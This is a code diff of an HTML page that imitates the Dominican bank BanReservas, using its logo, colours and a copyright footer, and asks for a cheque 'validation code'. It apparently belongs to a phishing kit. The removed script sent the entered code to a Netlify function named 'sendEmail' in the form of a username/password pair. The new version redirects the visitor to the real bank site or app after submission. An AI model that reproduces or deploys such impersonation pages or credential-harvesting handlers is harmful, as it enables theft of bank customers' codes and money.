@@ -6,94 +6,113 @@
     <title>Validación de Cheque - BanReservas</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f7f7f7;
+            font-family: 'Arial', sans-serif;
+            background-color: #003a72; /* Fondo azul */
             margin: 0;
             padding: 0;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
-            height: 100vh;
+            justify-content: flex-start;
+            min-height: 100vh;
         }
+
+        .logo {
+            margin: 20px 0;
+        }
+
+        .logo img {
+            max-width: 150px;
+        }
+
         .container {
             background-color: #ffffff;
             width: 100%;
             max-width: 400px;
             padding: 20px;
             border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.25);
             text-align: center;
+            margin-top: 10px;
         }
-        .logo {
-            margin-bottom: 20px;
-        }
-        .logo img {
-            max-width: 150px;
-        }
+
         h2 {
-            color: #003366;
+            color: #003a72;
             font-size: 1.2em;
-            margin-bottom: 20px;
+            margin: 10px 0 20px;
         }
+
         form {
             display: flex;
             flex-direction: column;
             gap: 15px;
         }
+
         input[type="text"] {
             padding: 10px;
-            border: 1px solid #cccccc;
+            border: 1px solid #d1d1d1;
             border-radius: 5px;
             font-size: 1em;
         }
+
+        input[type="text"]:focus {
+            outline: none;
+            border: 1px solid #003a72;
+            box-shadow: 0 0 5px rgba(0, 58, 114, 0.5);
+        }
+
         button {
-            background-color: #003366;
+            background-color: #003a72;
             color: #ffffff;
             padding: 10px;
             border: none;
             border-radius: 5px;
             font-size: 1em;
             cursor: pointer;
+            transition: background-color 0.3s ease;
         }
+
         button:hover {
             background-color: #00509e;
+        }
+
+        button:active {
+            background-color: #002855;
+        }
+
+        footer {
+            margin-top: 15px;
+            font-size: 0.9em;
+            color: #ffffff;
+            text-align: center;
         }
     </style>
 </head>
 <body>
+    <div class="logo">
+        <img src="assets/logo-banreservas.png" alt="Logo de BanReservas">
+    </div>
     <div class="container">
-        <div class="logo">
-            <img src="public/assets/logo-banreservas.png" alt="Logo de BanReservas">
-        </div>
-        <h2>Ingrese el código para completar la validación del cheque</h2>
+        <h2>Validación de Cheque</h2>
+        <p>Por favor, ingrese el código de validación proporcionado para continuar.</p>
         <form id="codeForm">
             <input type="text" id="code" name="code" placeholder="Código de validación" required>
             <button type="submit">Validar</button>
         </form>
     </div>
+    <footer>© 2025 BanReservas. Todos los derechos reservados.</footer>
 
     <script>
-        document.getElementById('codeForm').addEventListener('submit', async function (e) {
+        document.getElementById('codeForm').addEventListener('submit', function (e) {
             e.preventDefault();
-            const code = document.getElementById('code').value;
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
-            try {
-                const response = await fetch('/.netlify/functions/sendEmail', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ username: code, password: '' }),
-                });
-
-                if (response.ok) {
-                    alert('El código fue enviado con éxito.');
-                } else {
-                    alert('Hubo un error al validar el código.');
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                alert('Hubo un problema al procesar la solicitud.');
+            if (isMobile) {
+                // Redirigir a la aplicación móvil de BanReservas (usando su URL personalizada)
+                window.location.href = 'banreservas://';
+            } else {
+                // Redirigir a la página oficial de BanReservas
+                window.location.href = 'https://www.banreservas.com/';
             }
         });
     </script>
